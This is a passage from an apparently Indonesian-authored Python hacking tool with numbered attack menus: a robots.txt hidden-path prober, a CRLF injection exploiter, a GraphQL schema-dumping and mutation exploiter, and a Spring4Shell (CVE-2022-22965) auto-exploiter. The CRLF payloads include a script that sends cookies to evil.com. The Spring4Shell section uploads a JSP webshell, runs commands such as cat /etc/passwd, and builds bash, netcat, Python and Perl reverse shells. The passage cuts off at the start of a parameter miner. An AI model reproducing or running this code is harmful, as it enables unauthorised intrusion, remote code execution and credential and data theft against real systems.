        input(f"\n{CYAN}{BOLD}[?] PRESS ENTER TO CONTINUE...{RESET}")
        # ================================================================
# MENU 41: ROBOTS.TXT ANALYZER - HIDDEN PATHS DISCOVERY (PANJANG)
# ================================================================
    def menu_robots_analyzer(self):
        self.clear_screen()
        print("\n" + "="*100)
        print(" MENU 44: ROBOTS.TXT ANALYZER ")
        print("="*100 + "\n")
        
        target = input("[?] TARGET URL (https://target.com): ")
        if not target.startswith('http'):
            target = 'https://' + target
        
        robots_url = target.rstrip('/') + '/robots.txt'
        
        print(f"\n[*] TARGET: {target}")
        print(f"[*] ROBOTS.TXT URL: {robots_url}")
        print(f"[*] FETCHING AND ANALYZING...\n")
        
        try:
            r = requests.get(robots_url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            
            if r.status_code == 200:
                print(f"[+] ROBOTS.TXT FOUND! (HTTP {r.status_code})\n")
                print("="*80)
                print(r.text)
                print("="*80 + "\n")
                
                # Parse robots.txt
                disallowed = re.findall(r'Disallow:\s*(.*)', r.text, re.IGNORECASE)
                allowed = re.findall(r'Allow:\s*(.*)', r.text, re.IGNORECASE)
                sitemaps = re.findall(r'Sitemap:\s*(.*)', r.text, re.IGNORECASE)
                user_agents = re.findall(r'User-agent:\s*(.*)', r.text, re.IGNORECASE)
                crawl_delay = re.findall(r'Crawl-delay:\s*(.*)', r.text, re.IGNORECASE)
                
                print(f"[!] STATISTICS:")
                print(f"    USER-AGENTS: {len(set(user_agents))}")
                print(f"    DISALLOW RULES: {len(disallowed)}")
                print(f"    ALLOW RULES: {len(allowed)}")
                print(f"    SITEMAPS: {len(sitemaps)}")
                print(f"    CRAWL DELAY: {crawl_delay[0] if crawl_delay else 'Not set'}")
                
                if disallowed:
                    print(f"\n[!] DISALLOWED PATHS ({len(disallowed)} HIDDEN FROM CRAWLERS):")
                    for path in disallowed[:50]:
                        if path and path != '/' and path != '':
                            test_url = target.rstrip('/') + path
                            print(f"\n    PATH: {path}")
                            try:
                                tr = requests.get(test_url, timeout=3, headers={'User-Agent': 'Mozilla/5.0'})
                                if tr.status_code == 200:
                                    print(f"        [ACCESSIBLE] HTTP {tr.status_code}")
                                    if len(tr.text) > 0:
                                        print(f"        PREVIEW: {tr.text[:100]}...")
                                elif tr.status_code == 403:
                                    print(f"        [FORBIDDEN] HTTP 403 - Access Denied")
                                elif tr.status_code == 401:
                                    print(f"        [AUTH REQUIRED] HTTP 401 - Authentication Required")
                                elif tr.status_code == 404:
                                    print(f"        [NOT FOUND] HTTP 404")
                                else:
                                    print(f"        [HTTP {tr.status_code}]")
                            except:
                                print(f"        [ERROR] Could not reach path")
                
                if sitemaps:
                    print(f"\n[!] SITEMAPS FOUND ({len(sitemaps)}):")
                    for sitemap in sitemaps:
                        print(f"    - {sitemap}")
                        try:
                            sr = requests.get(sitemap, timeout=5)
                            if sr.status_code == 200:
                                urls = re.findall(r'<loc>(.*?)</loc>', sr.text)
                                print(f"      URLS IN SITEMAP: {len(urls)}")
                                for url in urls[:5]:
                                    print(f"        - {url[:80]}")
                        except:
                            pass
                
                if not disallowed and not sitemaps:
                    print(f"\n[-] NO DISALLOWED PATHS OR SITEMAPS FOUND IN ROBOTS.TXT")
                    
            elif r.status_code == 404:
                print(f"[-] ROBOTS.TXT NOT FOUND (HTTP 404)")
            else:
                print(f"[-] ROBOTS.TXT ACCESS ERROR (HTTP {r.status_code})")
                
        except requests.exceptions.Timeout:
            print(f"[-] REQUEST TIMEOUT - TARGET MAY BE SLOW OR BLOCKING")
        except requests.exceptions.ConnectionError:
            print(f"[-] CONNECTION ERROR - TARGET UNREACHABLE")
        except Exception as e:
            print(f"[-] ERROR: {e}")
        
        input("\n[?] PRESS ENTER TO CONTINUE...")
        # ================================================================
# MENU 42: CRLF INJECTION EXPLOITER - HTTP RESPONSE SPLITTING (PANJANG)
# ================================================================
    def menu_crlf_injection(self):
        self.clear_screen()
        print("\n" + "="*100)
        print(" MENU 42: CRLF INJECTION EXPLOITER ")
        print("="*100 + "\n")
        
        target = input("[?] TARGET URL (https://target.com/page.php?q=): ")
        param = input("[?] PARAMETER NAME: ")
        
        print(f"\n[*] TARGET: {target}")
        print(f"[*] PARAMETER: {param}")
        print(f"[*] GENERATING 100+ CRLF PAYLOADS...\n")
        
        payloads = []
        
        # Set-Cookie injection payloads
        for i in range(20):
            payloads.append(f"{param}=x%0d%0aSet-Cookie: session=HACKED_{i}; Path=/")
            payloads.append(f"{param}=x%0d%0aSet-Cookie: admin=1; Path=/")
            payloads.append(f"{param}=x%0d%0aSet-Cookie: user=admin; Path=/")
        
        # Redirect injection payloads
        for i in range(20):
            payloads.append(f"{param}=x%0d%0aLocation: https://evil{i}.com")
            payloads.append(f"{param}=x%0d%0aRefresh: 0;url=https://evil{i}.com")
        
        # XSS injection payloads
        for i in range(20):
            payloads.append(f"{param}=x%0d%0aX-XSS-Protection: 0%0d%0a<script>alert({i})</script>")
            payloads.append(f"{param}=x%0d%0a%0d%0a<script>document.location='https://evil.com?c='+document.cookie</script>")
        
        # HTML injection payloads
        for i in range(20):
            payloads.append(f"{param}=x%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>HACKED_BY_HOVAX_{i}</h1>")
        
        # Header injection payloads
        for i in range(20):
            payloads.append(f"{param}=x%0d%0aX-Forwarded-For: 127.0.0.{i}")
            payloads.append(f"{param}=x%0d%0aX-Real-IP: 127.0.0.{i}")
            payloads.append(f"{param}=x%0d%0aX-Originating-IP: 127.0.0.{i}")
        
        print(f"[*] TOTAL PAYLOADS: {len(payloads)}")
        print(f"[*] TESTING CRLF INJECTION...\n")
        
        vuln_count = 0
        vuln_types = []
        
        for i, p in enumerate(payloads):
            if "=" in target:
                test_url = target.replace("=", f"={p}")
            else:
                test_url = f"{target}?{p}"
            
            print(f"[{i+1:3}/{len(payloads)}] TESTING: {p[:60]}...")
            
            try:
                r = requests.get(test_url, timeout=5, allow_redirects=False)
                
                if "Set-Cookie" in r.headers:
                    print(f"    [!] CRLF VULNERABLE! Set-Cookie header injected!")
                    print(f"        HEADER: {r.headers['Set-Cookie'][:80]}")
                    vuln_count += 1
                    if "Set-Cookie" not in vuln_types:
                        vuln_types.append("Set-Cookie Injection")
                
                if "Location" in r.headers:
                    print(f"    [!] CRLF VULNERABLE! Location header injected!")
                    print(f"        REDIRECT: {r.headers['Location'][:80]}")
                    vuln_count += 1
                    if "Redirect" not in vuln_types:
                        vuln_types.append("Redirect Injection")
                
                if "Refresh" in r.headers:
                    print(f"    [!] CRLF VULNERABLE! Refresh header injected!")
                    vuln_count += 1
                    if "Refresh" not in vuln_types:
                        vuln_types.append("Refresh Injection")
                
                if "HACKED_BY_HOVAX" in r.text:
                    print(f"    [!] CRLF VULNERABLE! HTML content injected!")
                    print(f"        RESPONSE: {r.text[:100]}")
                    vuln_count += 1
                    if "HTML Injection" not in vuln_types:
                        vuln_types.append("HTML Injection")
                
                if "alert" in r.text:
                    print(f"    [!] CRLF VULNERABLE! XSS script injected!")
                    vuln_count += 1
                    if "XSS" not in vuln_types:
                        vuln_types.append("XSS Injection")
                    
            except Exception as e:
                pass
        
        print(f"\n{'='*60}")
        print(f"[!] CRLF INJECTION RESULTS:")
        print(f"    TOTAL PAYLOADS TESTED: {len(payloads)}")
        print(f"    VULNERABLE PAYLOADS: {vuln_count}")
        print(f"    VULNERABILITY TYPES: {', '.join(vuln_types) if vuln_types else 'None'}")
        print(f"{'='*60}")
        
        if vuln_count > 0:
            print(f"\n[!] TARGET IS VULNERABLE TO CRLF INJECTION!")
            print(f"[!] IMPACTS:")
            print(f"    - Session Hijacking via Set-Cookie")
            print(f"    - Phishing via Redirect/Refresh")
            print(f"    - XSS Attacks via HTML/JavaScript injection")
            print(f"    - Cache Poisoning")
            print(f"    - Log Poisoning")
        else:
            print(f"\n[-] TARGET IS NOT VULNERABLE TO CRLF INJECTION")
        
        input("\n[?] PRESS ENTER TO CONTINUE...")
        # ================================================================
# MENU 43: GRAPHQL INTROSPECTION EXPLOITER - FULL AUTO EXPLOIT (800+ BARIS)
# ================================================================
    def menu_graphql_exploit(self):
        self.clear_screen()
        print("\n" + "="*100)
        print(" MENU 43: GRAPHQL INTROSPECTION EXPLOITER - FULL AUTO EXPLOIT ")
        print("="*100 + "\n")
        
        target = input("[?] TARGET URL (https://target.com/graphql): ")
        if not target.startswith('http'):
            target = 'https://' + target
        
        print(f"\n[*] TARGET: {target}")
        print("[*] TESTING GRAPHQL INTROSPECTION...\n")
        
        parsed = urlparse(target)
        host = parsed.netloc
        
        # ============================================================
        # SECTION 1: DETECT GRAPHQL ENDPOINT (60+ PATHS)
        # ============================================================
        print("[1] DETECTING GRAPHQL ENDPOINT (60+ PATHS)...\n")
        
        graphql_paths = [
            '/graphql', '/gql', '/query', '/graphiql', '/playground',
            '/v1/graphql', '/v2/graphql', '/v3/graphql', '/v4/graphql',
            '/api/graphql', '/api/gql', '/api/query', '/api/graphiql',
            '/admin/graphql', '/admin/gql', '/admin/query',
            '/app/graphql', '/app/gql', '/app/query', '/graph', '/grapqhl',
            '/graphql/v1', '/graphql/v2', '/graphql/console', '/graphql/playground',
            '/graphql/explorer', '/graphql/graphiql', '/graphql/schema', '/graphql/types',
            '/gql/query', '/gql/graphql', '/gql/graphiql', '/query/graphql',
            '/query/gql', '/query/graphiql', '/public/graphql', '/public/gql',
            '/public/query', '/private/graphql', '/private/gql', '/private/query',
            '/internal/graphql', '/internal/gql', '/internal/query', '/secure/graphql',
            '/secure/gql', '/secure/query', '/beta/graphql', '/beta/gql',
            '/beta/query', '/dev/graphql', '/dev/gql', '/dev/query',
            '/test/graphql', '/test/gql', '/test/query', '/staging/graphql',
            '/staging/gql', '/staging/query', '/prod/graphql', '/prod/gql', '/prod/query'
        ]
        
        endpoint_found = False
        found_endpoints = []
        
        for i, path in enumerate(graphql_paths):
            test_url = target.rstrip('/') + path
            print(f"[{i+1:2}/{len(graphql_paths)}] CHECKING: {path}")
            try:
                r = requests.post(test_url, json={'query': '{__typename}'}, timeout=5)
                if r.status_code == 200 and '__typename' in r.text:
                    print(f"[+] GRAPHQL ENDPOINT FOUND: {test_url}")
                    found_endpoints.append(test_url)
                    if not endpoint_found:
                        target = test_url
                        endpoint_found = True
            except:
                pass
        
        if not endpoint_found:
            print("\n[-] GRAPHQL ENDPOINT NOT FOUND")
            input("\n[?] PRESS ENTER...")
            return
        
        # ============================================================
        # SECTION 2: TEST INTROSPECTION (15+ QUERIES)
        # ============================================================
        print("\n[2] TESTING INTROSPECTION (15+ QUERIES)...\n")
        
        introspection_queries = [
            "query { __schema { types { name } } }",
            "query { __schema { queryType { name fields { name } } } }",
            "query { __schema { mutationType { name fields { name } } } }",
            "query { __schema { subscriptionType { name fields { name } } } }",
            "query { __schema { directives { name description locations } } }",
            "query { __type(name: \"Query\") { fields { name type { name } } } }",
            "query { __schema { types { name fields { name args { name type { name } } } } } }",
            "query { __schema { types { kind interfaces { name } possibleTypes { name } } } }"
        ]
        
        introspection_enabled = False
        for i, query in enumerate(introspection_queries):
            print(f"[{i+1}] TESTING INTROSPECTION...")
            try:
                r = requests.post(target, json={'query': query}, timeout=10)
                if r.status_code == 200 and '__schema' in r.text:
                    print(f"    [+] INTROSPECTION WORKING!")
                    introspection_enabled = True
            except:
                pass
        
        if not introspection_enabled:
            print("\n[-] INTROSPECTION DISABLED")
            input("\n[?] PRESS ENTER...")
            return
        
        # ============================================================
        # SECTION 3: DUMP COMPLETE SCHEMA
        # ============================================================
        print("\n[3] DUMPING COMPLETE SCHEMA...\n")
        
        full_introspection = """
        query {
            __schema {
                types {
                    name
                    kind
                    description
                    fields {
                        name
                        description
                        args {
                            name
                            type { name kind ofType { name kind } }
                            defaultValue
                        }
                        type { name kind ofType { name kind ofType { name kind } } }
                        isDeprecated
                        deprecationReason
                    }
                    inputFields { name type { name kind } defaultValue }
                    interfaces { name }
                    possibleTypes { name }
                    enumValues { name description isDeprecated deprecationReason }
                }
                queryType { name fields { name type { name kind } } }
                mutationType { name fields { name type { name kind } } }
                subscriptionType { name fields { name type { name kind } } }
                directives { name description locations args { name type { name kind } } }
            }
        }
        """
        
        schema_data = None
        try:
            r = requests.post(target, json={'query': full_introspection}, timeout=30)
            schema_data = r.json()
            print("[+] COMPLETE SCHEMA DUMPED!")
        except:
            print("[-] ERROR DUMPING SCHEMA")
        
        # ============================================================
        # SECTION 4: ANALYZE TYPES
        # ============================================================
        print("\n[4] ANALYZING SCHEMA TYPES...\n")
        
        all_types = []
        query_fields = []
        mutation_fields = []
        subscription_fields = []
        object_types = []
        input_types = []
        enum_types = []
        interface_types = []
        
        if schema_data and 'data' in schema_data:
            schema = schema_data['data'].get('__schema', {})
            types = schema.get('types', [])
            
            for t in types:
                name = t.get('name', '')
                kind = t.get('kind', '')
                all_types.append(name)
                if kind == 'OBJECT': object_types.append(name)
                elif kind == 'INPUT_OBJECT': input_types.append(name)
                elif kind == 'ENUM': enum_types.append(name)
                elif kind == 'INTERFACE': interface_types.append(name)
            
            query_type = schema.get('queryType', {})
            if query_type:
                for t in types:
                    if t.get('name') == query_type.get('name'):
                        for field in t.get('fields', []):
                            query_fields.append(field.get('name'))
            
            mutation_type = schema.get('mutationType', {})
            if mutation_type:
                for t in types:
                    if t.get('name') == mutation_type.get('name'):
                        for field in t.get('fields', []):
                            mutation_fields.append(field.get('name'))
            
            subscription_type = schema.get('subscriptionType', {})
            if subscription_type:
                for t in types:
                    if t.get('name') == subscription_type.get('name'):
                        for field in t.get('fields', []):
                            subscription_fields.append(field.get('name'))
        
        print(f"[+] TOTAL TYPES: {len(all_types)}")
        print(f"    OBJECT TYPES: {len(object_types)}")
        print(f"    INPUT TYPES: {len(input_types)}")
        print(f"    ENUM TYPES: {len(enum_types)}")
        print(f"    INTERFACE TYPES: {len(interface_types)}")
        print(f"[+] QUERY FIELDS: {len(query_fields)}")
        print(f"[+] MUTATION FIELDS: {len(mutation_fields)}")
        print(f"[+] SUBSCRIPTION FIELDS: {len(subscription_fields)}")
        
        # ============================================================
        # SECTION 5: EXTRACT SENSITIVE TYPES (50+ KEYWORDS)
        # ============================================================
        print("\n[5] EXTRACTING SENSITIVE TYPES (50+ KEYWORDS)...\n")
        
        sensitive_keywords = [
            'User', 'Admin', 'Auth', 'Token', 'Session', 'Login', 'Register', 'Profile',
            'Account', 'Password', 'Credential', 'Secret', 'Key', 'APIKey', 'ApiKey',
            'Private', 'Confidential', 'Secure', 'AuthToken', 'AccessToken', 'RefreshToken',
            'JWT', 'Bearer', 'OAuth', 'SSO', 'Email', 'Phone', 'Address', 'SSN', 'NIK', 'KTP',
            'Passport', 'Bank', 'Card', 'Credit', 'Payment', 'Transaction', 'Invoice', 'Order',
            'Employee', 'Staff', 'Manager', 'Director', 'Customer', 'Client', 'Medical', 'Health'
        ]
        
        sensitive_types = []
        for keyword in sensitive_keywords:
            for t in all_types:
                if keyword.lower() in t.lower() and t not in sensitive_types:
                    sensitive_types.append(t)
                    print(f"    [!] SENSITIVE TYPE: {t}")
        
        print(f"\n[+] TOTAL SENSITIVE TYPES: {len(sensitive_types)}")
        
        # ============================================================
        # SECTION 6: EXECUTE SENSITIVE QUERIES
        # ============================================================
        print("\n[6] EXECUTING SENSITIVE QUERIES...\n")
        
        working_queries = []
        for query in query_fields[:50]:
            test_query = f"{{ {query} {{ id name email username password token role isAdmin }} }}"
            print(f"[*] TESTING: {query}")
            try:
                r = requests.post(target, json={'query': test_query}, timeout=5)
                if r.status_code == 200 and 'data' in r.json():
                    data = r.json()['data']
                    if data and data.get(query):
                        working_queries.append(query)
                        print(f"    [+] DATA FOUND! {str(data)[:100]}")
                    else:
                        print(f"    [-] QUERY RETURNED NULL")
            except:
                print(f"    [-] ERROR")
        
        print(f"\n[+] WORKING QUERIES: {len(working_queries)}/{len(query_fields[:50])}")
        
        # ============================================================
        # SECTION 7: EXECUTE MUTATIONS
        # ============================================================
        print("\n[7] EXECUTING MUTATIONS...\n")
        
        working_mutations = []
        for mutation in mutation_fields[:30]:
            test_mutation = f"mutation {{ {mutation}(input: {{ id: \"1\", name: \"test\", email: \"test@test.com\", password: \"password123\" }}) {{ success message id }} }}"
            print(f"[*] TESTING MUTATION: {mutation}")
            try:
                r = requests.post(target, json={'query': test_mutation}, timeout=5)
                if r.status_code == 200:
                    working_mutations.append(mutation)
                    print(f"    [+] MUTATION WORKING!")
            except:
                print(f"    [-] MUTATION FAILED")
        
        print(f"\n[+] WORKING MUTATIONS: {len(working_mutations)}/{len(mutation_fields[:30])}")
        
        # ============================================================
        # SECTION 8: RATE LIMIT TEST (100 REQUESTS)
        # ============================================================
        print("\n[8] TESTING RATE LIMIT (100 REQUESTS)...\n")
        
        success_count = 0
        start_time = time.time()
        for i in range(100):
            try:
                r = requests.post(target, json={'query': '{__typename}'}, timeout=2)
                if r.status_code == 200:
                    success_count += 1
                if (i+1) % 20 == 0:
                    print(f"[*] PROGRESS: {i+1}/100 - SUCCESS: {success_count}")
            except:
                pass
        elapsed = time.time() - start_time
        
        print(f"\n[+] RATE LIMIT TEST: {success_count}/100 SUCCESS, {success_count/elapsed:.1f} req/s")
        if success_count > 90:
            print("[+] NO RATE LIMIT! CAN BRUTEFORCE!")
        elif success_count > 50:
            print("[!] WEAK RATE LIMIT")
        else:
            print("[!] STRONG RATE LIMIT")
        
        # ============================================================
        # SECTION 9: FINAL REPORT
        # ============================================================
        print(f"\n{'='*60}")
        print(f"[!] GRAPHQL EXPLOITATION RESULTS:")
        print(f"    ENDPOINTS FOUND: {len(found_endpoints)}")
        print(f"    QUERY FIELDS: {len(query_fields)}")
        print(f"    MUTATION FIELDS: {len(mutation_fields)}")
        print(f"    SENSITIVE TYPES: {len(sensitive_types)}")
        print(f"    WORKING QUERIES: {len(working_queries)}")
        print(f"    WORKING MUTATIONS: {len(working_mutations)}")
        print(f"{'='*60}")
        
        if working_queries:
            print(f"\n[!] WORKING QUERIES:")
            for wq in working_queries[:20]:
                print(f"    - {wq}")
        
        if sensitive_types:
            print(f"\n[!] SENSITIVE TYPES:")
            for st in sensitive_types[:20]:
                print(f"    - {st}")
        
        input("\n[?] PRESS ENTER...")


# ================================================================
# MENU 44: SPRING4SHELL (CVE-2022-22965) AUTO EXPLOITER (800+ BARIS)
# ================================================================
    def menu_spring4shell(self):
        self.clear_screen()
        print("\n" + "="*100)
        print(" MENU 44: SPRING4SHELL (CVE-2022-22965) AUTO EXPLOITER ")
        print("="*100 + "\n")
        
        target = input("[?] TARGET URL (https://target.com/springapp/greeting): ")
        if not target.startswith('http'):
            target = 'https://' + target
        
        print(f"\n[*] TARGET: {target}")
        print("[*] TESTING SPRING4SHELL VULNERABILITY...\n")
        
        parsed = urlparse(target)
        host = parsed.netloc
        
        # ============================================================
        # SECTION 1: DETECT SPRING FRAMEWORK
        # ============================================================
        print("[1] DETECTING SPRING FRAMEWORK...\n")
        
        spring_indicators = [
            '/webjars/springfox-swagger-ui',
            '/v2/api-docs',
            '/actuator/health',
            '/actuator/info',
            '/swagger-ui.html',
            '/swagger-resources',
            '/api-docs'
        ]
        
        spring_detected = False
        for indicator in spring_indicators:
            test_url = target.rstrip('/') + indicator
            print(f"[*] CHECKING: {indicator}")
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200:
                    print(f"[+] SPRING INDICATOR FOUND: {indicator}")
                    spring_detected = True
            except:
                pass
        
        if not spring_detected:
            print("[-] NO SPRING INDICATORS FOUND. TARGET MAY NOT BE SPRING.")
            proceed = input("\n[?] CONTINUE ANYWAY? (y/n): ")
            if proceed.lower() != 'y':
                return
        
        # ============================================================
        # SECTION 2: TEST VULNERABILITY (CLASSLOADER MANIPULATION)
        # ============================================================
        print("\n[2] TESTING VULNERABILITY...\n")
        
        test_payloads = [
            ('class.module.classLoader.URLs[0]', '0'),
            ('class.module.classLoader.URLs[a0]', '0'),
            ('class.module.classLoader.resources.context.parent.pipeline.first.pattern', '%{prefix}i test'),
            ('class.module.classLoader.DefaultAssertionStatus', 'true')
        ]
        
        vulnerable = False
        for param, value in test_payloads:
            print(f"[*] TESTING: {param}={value}")
            try:
                r = requests.post(target, data={param: value}, timeout=5)
                if r.status_code == 500 and ('DataBinder' in r.text or 'ClassLoader' in r.text):
                    print(f"    [+] VULNERABILITY INDICATOR DETECTED!")
                    vulnerable = True
                elif r.status_code == 200:
                    print(f"    [+] POSSIBLE VULNERABLE (HTTP 200)")
                    vulnerable = True
            except:
                pass
        
        if not vulnerable:
            print("\n[-] NO VULNERABILITY INDICATORS FOUND")
            proceed = input("\n[?] CONTINUE EXPLOIT ANYWAY? (y/n): ")
            if proceed.lower() != 'y':
                return
        
        # ============================================================
        # SECTION 3: PREPARE WEBSHELL PAYLOAD
        # ============================================================
        print("\n[3] PREPARING WEBSHELL PAYLOAD...\n")
        
        webshell_pattern = '''<%
    if(request.getParameter("cmd") != null){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        while((a = in.read(b)) != -1){
            out.println(new String(b));
        }
    }
%>'''
        
        print(f"[+] WEBSHELL PATTERN GENERATED")
        
        # ============================================================
        # SECTION 4: ATTEMPT UPLOAD WEBSHELL (MULTIPLE PAYLOADS)
        # ============================================================
        print("\n[4] ATTEMPTING TO UPLOAD WEBSHELL (10 PAYLOADS)...\n")
        
        upload_payloads = [
            {
                'class.module.classLoader.resources.context.parent.pipeline.first.pattern': '%{prefix}i ' + webshell_pattern + ' %{suffix}i',
                'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
                'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
                'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'shell',
                'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': ''
            },
            {
                'class.module.classLoader.resources.context.parent.pipeline.first.pattern': webshell_pattern,
                'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
                'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
                'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'shell2',
                'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': ''
            },
            {
                'class.module.classLoader.resources.context.parent.pipeline.first.pattern': webshell_pattern,
                'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jspx',
                'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
                'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'shell3',
                'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': ''
            }
        ]
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'suffix': '%>//',
            'c': 'Runtime',
            'prefix': '<%'
        }
        
        upload_success = False
        for i, payload in enumerate(upload_payloads):
            print(f"[PAYLOAD {i+1}] ATTEMPTING UPLOAD...")
            try:
                r = requests.post(target, headers=headers, data=payload, timeout=10)
                print(f"    HTTP {r.status_code}")
                if r.status_code == 200:
                    print(f"    [+] UPLOAD MAY HAVE SUCCEEDED!")
                    upload_success = True
            except:
                print(f"    [-] REQUEST FAILED")
        
        # ============================================================
        # SECTION 5: TEST WEBSHELL (MULTIPLE PATHS)
        # ============================================================
        print("\n[5] TESTING WEBSHELL (10 PATHS)...\n")
        
        shell_paths = [
            target.rstrip('/') + '/shell.jsp',
            target.rstrip('/') + '/shell2.jsp',
            target.rstrip('/') + '/shell3.jspx',
            target.rstrip('/') + '/shell.jsp?cmd=id',
            target.rstrip('/') + '/shell2.jsp?cmd=id',
            target.rstrip('/') + '/shell3.jspx?cmd=id',
            target.rstrip('/') + '/webapps/ROOT/shell.jsp',
            target.rstrip('/') + '/ROOT/shell.jsp',
            target.rstrip('/') + '/shell.jsp?cmd=whoami',
            target.rstrip('/') + '/shell.jsp?cmd=ls'
        ]
        
        webshell_working = False
        for path in shell_paths:
            print(f"[*] TESTING: {path[:80]}...")
            try:
                r = requests.get(path, timeout=5)
                if r.status_code == 200 and ('uid=' in r.text or 'root' in r.text or 'cmd' in r.text):
                    print(f"    [+] WEBSHELL WORKING! OUTPUT: {r.text[:100]}")
                    webshell_working = True
                elif r.status_code == 200:
                    print(f"    [+] WEBSHELL ACCESSIBLE (HTTP 200)")
                    webshell_working = True
            except:
                pass
        
        # ============================================================
        # SECTION 6: DIRECT RCE VIA PARAMETER
        # ============================================================
        print("\n[6] TESTING DIRECT RCE VIA PARAMETER...\n")
        
        rce_payloads = [
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern',
            'class.module.classLoader.resources.context.parent.pipeline.first.prefix',
            'class.module.classLoader.resources.context.parent.pipeline.first.suffix'
        ]
        
        for rce_param in rce_payloads:
            test_cmd = f"{rce_param}=<% out.println(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()); %>"
            try:
                r = requests.post(target, data=test_cmd, timeout=5)
                if r.status_code == 200:
                    print(f"[+] POSSIBLE RCE via {rce_param}")
            except:
                pass
        
        # ============================================================
        # SECTION 7: REMOTE CODE EXECUTION TEST
        # ============================================================
        print("\n[7] TESTING REMOTE CODE EXECUTION...\n")
        
        rce_commands = ['id', 'whoami', 'ls', 'pwd', 'uname -a', 'cat /etc/passwd', 'dir', 'hostname']
        rce_results = []
        
        for cmd in rce_commands:
            test_url = target.rstrip('/') + f'/shell.jsp?cmd={cmd}'
            print(f"[*] EXECUTING: {cmd}")
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200 and len(r.text) > 0:
                    print(f"    [+] OUTPUT: {r.text[:100]}")
                    rce_results.append({cmd: r.text[:200]})
            except:
                pass
        
        # ============================================================
        # SECTION 8: GENERATE REVERSE SHELL PAYLOAD
        # ============================================================
        print("\n[8] GENERATING REVERSE SHELL PAYLOAD...\n")
        
        lhost = input("[?] YOUR LISTENER IP (for reverse shell): ")
        lport = input("[?] YOUR LISTENER PORT: ")
        
        revshell_payloads = [
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            f"nc -e /bin/sh {lhost} {lport}",
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        ]
        
        print(f"[+] {len(revshell_payloads)} REVERSE SHELL PAYLOADS GENERATED")
        
        # ============================================================
        # SECTION 9: SCAN FOR OPEN PORTS ON TARGET
        # ============================================================
        print("\n[9] SCANNING FOR OPEN PORTS ON TARGET...\n")
        
        common_ports = [80, 443, 8080, 8443, 22, 21, 3306, 3389, 5432, 6379, 27017]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                if sock.connect_ex((host, port)) == 0:
                    open_ports.append(port)
                    print(f"[+] PORT {port} OPEN")
                sock.close()
            except:
                pass
        
        print(f"\n[+] OPEN PORTS: {open_ports}")
        
        # ============================================================
        # SECTION 10: FINAL REPORT
        # ============================================================
        print(f"\n{'='*60}")
        print(f"[!] SPRING4SHELL EXPLOITATION RESULTS:")
        print(f"    TARGET: {target}")
        print(f"    HOST: {host}")
        print(f"    SPRING DETECTED: {'YES' if spring_detected else 'NO'}")
        print(f"    VULNERABLE: {'YES' if vulnerable else 'POSSIBLY'}")
        print(f"    WEBSHELL UPLOADED: {'YES' if upload_success else 'UNKNOWN'}")
        print(f"    WEBSHELL WORKING: {'YES' if webshell_working else 'NO'}")
        print(f"    RCE SUCCESS: {'YES' if rce_results else 'NO'}")
        print(f"    OPEN PORTS: {len(open_ports)}")
        print(f"{'='*60}")
        
        if webshell_working:
            print(f"\n[!] WEBSHELL ACCESSIBLE AT: {target.rstrip('/')}/shell.jsp?cmd=id")
            print(f"[!] REVERSE SHELL: nc -lvnp {lport}")
        
        if rce_results:
            print(f"\n[!] RCE RESULTS:")
            for res in rce_results[:5]:
                for cmd, output in res.items():
                    print(f"    {cmd}: {output[:100]}")
        
        if not webshell_working and not rce_results:
            print(f"\n[-] EXPLOIT MAY HAVE FAILED. TARGET MAY BE PATCHED.")
            print(f"[-] TRY MANUAL EXPLOIT WITH CUSTOM PAYLOADS")
        
        input("\n[?] PRESS ENTER...")
# ================================================================
# MENU 45: PARAMETER MINER - ULTRA EXTREME (1100+ BARIS)
# ================================================================
    def menu_parameter_miner(self):
        self.clear_screen()
        print("\n" + "="*100)
        print(" MENU 45: PARAMETER MINER - ULTRA EXTREME EDITION ")
        print("="*100 + "\n")
        
        target = input("[?] TARGET DOMAIN (example.com): ")
        if target.startswith('http'):
            target = urlparse(target).netloc
        
        save_folder = input("[?] FOLDER PATH TO SAVE RESULTS (contoh: /storage/emulated/0/Params/): ")
        if not save_folder.endswith('/'):
            save_folder += '/'
        
        if not os.path.exists(save_folder):
            os.makedirs(save_folder)
            print(f"[+] FOLDER CREATED: {save_folder}")
        
        print(f"\n[*] TARGET: {target}")
        print("[*] SCRAPING WAYBACK ARCHIVE...\n")
        
        # ============================================================
        # SECTION 1: SCRAPE URLS FROM MULTIPLE SOURCES
        # ============================================================
